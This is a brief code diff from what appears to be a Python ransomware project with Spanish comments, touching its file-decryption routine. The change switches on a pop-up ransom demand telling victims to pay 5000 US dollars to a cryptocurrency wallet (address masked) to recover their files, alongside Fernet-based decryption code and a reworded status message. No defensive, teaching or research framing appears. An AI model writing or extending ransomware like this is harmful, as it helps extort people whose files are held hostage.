@@ -36,9 +36,9 @@ def decrypt_key():
             return decrypted_fernet_key
 
     except FileNotFoundError:
-        #ctypes.windll.user32.MessageBoxW(0, "Para desencriptar los archivos, siga las instrucciones indicadas", "Error", 1)
-        print("Error")
+        ctypes.windll.user32.MessageBoxW(0, 'ERROR. In order to recover your files you must pay the ransom. To do this, you must transfer 5000 USD (Five thousand US dollars) to the following Wallet.\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', 'PAY THE RANSOM', 1)
         sys.exit(1)
+
 
 
 def decrypt_files(paths, file_key):
@@ -50,7 +50,7 @@ def decrypt_files(paths, file_key):
             decrypted = fernet.decrypt(archivo_encriptado)
             with open(file_path, 'wb') as f:
                 f.write(decrypted)
-            print("desencriptado:", file_path)
+            print("Se ha desencriptado el siguiente archivo :", file_path)
 
 
 def main():
